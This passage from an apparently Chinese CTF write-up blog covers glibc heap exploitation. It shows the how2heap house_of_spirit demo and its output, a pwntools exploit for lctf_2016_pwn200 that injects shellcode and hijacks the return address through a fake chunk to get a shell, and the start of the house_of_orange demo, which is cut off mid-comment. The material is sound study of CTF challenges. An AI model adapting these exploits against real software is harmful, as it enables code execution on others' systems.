class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);<br><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *a;<br><br><span class="hljs-comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> fake_chunks[<span class="hljs-number">10</span>] __attribute__ ((aligned (<span class="hljs-number">16</span>)));<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">9</span>]);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);<br><br>fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// this is the size</span><br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);<br><br>        <span class="hljs-comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span><br><br>fake_chunks[<span class="hljs-number">9</span>] = <span class="hljs-number">0x1234</span>; <span class="hljs-comment">// nextsize</span><br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);<br><br>a = &amp;fake_chunks[<span class="hljs-number">2</span>];<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the overwritten pointer.\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(a);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">2</span>]);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>));<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/house$ ./house_of_spirit<br>This file demonstrates the house of spirit attack.<br>Calling <span class="hljs-title function_">malloc</span><span class="hljs-params">()</span> once so that it sets up its memory.<br>We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.<br>This <span class="hljs-title function_">region</span> <span class="hljs-params">(memory of length: <span class="hljs-number">80</span>)</span> contains two chunks. The first starts at 0x7fffe5a3b378 and the second at 0x7fffe5a3b3b8.<br>This chunk.size of this region has to be 16 more than the <span class="hljs-title function_">region</span> <span class="hljs-params">(to accommodate the chunk data)</span> <span class="hljs-keyword">while</span> still falling into the fastbin <span class="hljs-title function_">category</span> <span class="hljs-params">(&lt;= <span class="hljs-number">128</span> on x64)</span>. The <span class="hljs-title function_">PREV_INUSE</span> <span class="hljs-params">(lsb)</span> bit is ignored by <span class="hljs-built_in">free</span> <span class="hljs-keyword">for</span> fastbin-sized chunks, however the <span class="hljs-title function_">IS_MMAPPED</span> <span class="hljs-params">(second lsb)</span> and <span class="hljs-title function_">NON_MAIN_ARENA</span> <span class="hljs-params">(third lsb)</span> bits cause problems.<br>... note that this has to be the size of the next <span class="hljs-built_in">malloc</span> request rounded to the internal size used by the <span class="hljs-built_in">malloc</span> implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work <span class="hljs-keyword">for</span> the <span class="hljs-built_in">malloc</span> parameter at the end. <br>The chunk.size of the *next* fake region has to be sane. That is &gt; 2*<span class="hljs-title function_">SIZE_SZ</span> <span class="hljs-params">(&gt; <span class="hljs-number">16</span> on x64)</span> &amp;&amp; &lt; av-&gt;<span class="hljs-title function_">system_mem</span> <span class="hljs-params">(&lt; <span class="hljs-number">128</span>kb by <span class="hljs-keyword">default</span> <span class="hljs-keyword">for</span> the main arena)</span> to pass the nextsize integrity checks. No need <span class="hljs-keyword">for</span> fastbin size.<br>Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffe5a3b378.<br>... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.<br>Freeing the overwritten pointer.<br>Now the next <span class="hljs-built_in">malloc</span> will <span class="hljs-keyword">return</span> the region of our fake chunk at 0x7fffe5a3b378, which will be 0x7fffe5a3b380!<br><span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">0x30</span>)</span>: 0x7fffe5a3b380<br></code></pre></td></tr></table></figure><h4 id="lctf-2016-pwn200"><a href="#lctf-2016-pwn200" class="headerlink" title="lctf_2016_pwn200"></a>lctf_2016_pwn200</h4><p>主要的攻击思路：</p><ol><li>将shellocode布置到栈上并且泄露rbp的值。</li><li>利用number_read函数布置next_size（需要查看汇编）。</li><li>在主函数调用sub_400A29()函数里布置fake_chunk，并覆盖ptr指向fake_chunk的用户区域。</li><li>释放fake_chunk，然后再申请，就会得到返回地址附近的控制权。</li><li>修改返回地址为shellcode的地址，攻击成功。</li></ol><p>WP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./pwn200&quot;</span>)<br><span class="hljs-comment">#sh = remote(&quot;node4.buuoj.cn&quot;, 27191)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode = asm(shellcraft.amd64.linux.sh())<br><br><span class="hljs-comment">#leak</span><br>sh.recvuntil(<span class="hljs-string">&quot;who are u?&quot;</span>)<br>payload = shellcode<br>sh.send(payload)<br>sh.recvuntil(payload)<br>rbp = u64(sh.recv(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">2</span>)<br>log.info(<span class="hljs-string">&quot;rbp:&quot;</span> + <span class="hljs-built_in">hex</span>(rbp))<br><br>shellcode_addr = rbp - <span class="hljs-number">0x50</span><br>log.info(<span class="hljs-string">&quot;shellcode_addr:&quot;</span> + <span class="hljs-built_in">hex</span>(shellcode_addr))<br>fake_ptr = shellcode_addr - <span class="hljs-number">0x40</span><br>log.info(<span class="hljs-string">&quot;fake_ptr:&quot;</span> + <span class="hljs-built_in">hex</span>(fake_ptr))<br><br><span class="hljs-comment">#fake_chunk</span><br>sh.sendlineafter(<span class="hljs-string">&quot;give me your id ~~?&quot;</span>, <span class="hljs-string">b&#x27;65&#x27;</span>)<br>fake_chunk = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x41</span>) + p64(<span class="hljs-number">0</span>) + p64(fake_ptr)<br>sh.sendafter(<span class="hljs-string">&quot;give me money~&quot;</span>, fake_chunk)<br><br><span class="hljs-comment"># gdb.attach(sh, &quot;b *0x400A82&quot;)</span><br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-comment">#free and malloc</span><br>sh.sendlineafter(<span class="hljs-string">&quot;choice : &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sh.sendlineafter(<span class="hljs-string">&quot;choice : &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>sh.sendlineafter(<span class="hljs-string">&quot;how long?&quot;</span>, <span class="hljs-string">b&#x27;48&#x27;</span>)<br><br><span class="hljs-comment">#chang return_address</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(shellcode_addr)<br>sh.recv()<br>sh.sendline(payload)<br><br><span class="hljs-comment"># gdb.attach(sh)</span><br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-comment">#pwn</span><br>sh.sendlineafter(<span class="hljs-string">&quot;choice : &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house_of_orange"></a>house_of_orange</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  It requires a leak of the heap and the libc</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   This function is just present to emulate the scenario where</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   the address of the function system is known.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">winner</span> <span class="hljs-params">( <span class="hljs-type">char</span> *ptr)</span>;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      using which the Top (also called the Wilderness) chunk can be corrupted.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      At the beginning of execution, the entire heap is part of the Top chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Thus, with every allocation, the Top chunks keeps getting smaller.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      And in a situation where the size of the Top chunk is smaller than the requested value,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      there are two possibilities:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       1) Extend the Top chunk</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       2) Mmap a new page</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      If the size requested is smaller than 0x21000, then the former is followed.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    <span class="hljs-type">char</span> *p1, *p2;<br><br>    <span class="hljs-type">size_t</span> io_list_all, *top;<br><br><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span><br><br>        <span class="hljs-string">&quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;</span>);<br><br>  <br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span><br><br>        <span class="hljs-string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);<br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Firstly, lets allocate a chunk on the heap.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span><span class="hljs-number">-16</span>);<br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       The heap is usually allocated with a top chunk of size 0x21000</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Since we&#x27;ve allocate a chunk of size 0x400 already,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       what&#x27;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       it must also be page aligned at the end.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       So that means that there are two conditions that must always be true.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        1) Top chunk + size has to be page aligned</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        2) Top chunk&#x27;s prev_inuse bit has to be set.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       What&#x27;s left is 0x20c01</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Now, let&#x27;s satisfy the conditions</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       1) Top chunk + size has to be page aligned</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       2) Top chunk&#x27;s prev_inuse bit has to be set.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    top = (<span class="hljs-type">size_t</span> *) ( (<span class="hljs-type">char</span> *) p1 + <span class="hljs-number">0x400</span> - <span class="hljs-number">16</span>);<br><br>    top[<span class="hljs-number">1</span>] = <span class="hljs-number">0xc01</span>;<br><br><br><br>    <span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Now we request a chunk of size larger than the size of the Top chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Malloc tries to service this request by extending the Top chunk</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       This forces sysmalloc to be invoked.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      